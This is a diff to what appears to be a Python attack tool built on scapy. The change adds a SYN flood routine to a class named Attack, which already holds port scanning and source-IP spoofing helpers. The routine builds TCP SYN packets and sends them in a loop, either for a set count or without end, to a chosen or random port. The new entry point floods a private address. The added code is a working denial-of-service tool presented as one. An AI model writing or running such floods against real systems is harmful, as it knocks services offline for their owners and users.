@@ -1,8 +1,9 @@
+import random
 from scapy.layers.inet import TCP, IP
-from scapy.sendrecv import sr1
+from scapy.sendrecv import sr1, send
 from scapy.volatile import RandIP
-from constants import *
-from errorconstants import *
+from Constants.constants import *
+from Constants.errorconstants import *
 import sys
 
 
@@ -35,8 +36,26 @@ class Attack:
 
         _port_scan_print_results(counter, min_port, max_port)
 
+    @staticmethod
+    def syn_flood(target_ip: str, port: int, num_of_pkts: int):
+        # Initialize
+        print(SYN_FLOOD_INIT_MSG + f"[IP: {target_ip}]")
 
-# Helper Functions
+        # Randomize port if not provided in command-line args
+        target_port = _syn_flood_port_randomizer(port)
+
+        # Make packet
+        ip_header = IP(dst=target_ip)
+        tcp_header = TCP(dport=target_port, flags=SYN)
+        packet = ip_header / tcp_header
+
+        # Send SYN packets in flood
+        _send_syn_flood(num_of_pkts, packet)
+
+        print(WELCOME_DECORATION)
+
+
+####################################|| ATTACK HELPER FUNCTIONS ||####################################
 def _port_scan_helper(min_port, max_port):
     if min_port == ZERO:
         sys.exit(MIN_PORT_NOT_SPECIFIED_MSG)
@@ -76,5 +95,24 @@ def _source_ip_spoofer(source_ip):
     return source_ip
 
 
+def _send_syn_flood(num_of_pkts, packet):
+    if num_of_pkts is ZERO:
+        print(SYN_FLOOD_STOP_MSG)
+        send(packet, loop=1)
+        print(SYN_FLOOD_COMPLETE_FORCE_MSG)
+    else:
+        send(packet, loop=1, count=num_of_pkts)
+        print(SYN_FLOOD_COMPLETE_MSG)
+
+
+def _syn_flood_port_randomizer(port: int):
+    if port is ZERO:
+        print(RANDOMIZE_PORT_MSG)
+        port = random.randint(MIN_PORT, MAX_PORT)
+        print(RANDOMIZE_FINAL_MSG + str(port))
+
+    return port
+
+
 if __name__ == '__main__':
-    Attack.port_scan(target_ip="10.0.0.153", src_ip="10.0.0.231", min_port=1, max_port=9000)
+    Attack.syn_flood("10.0.0.153", 0, 69)
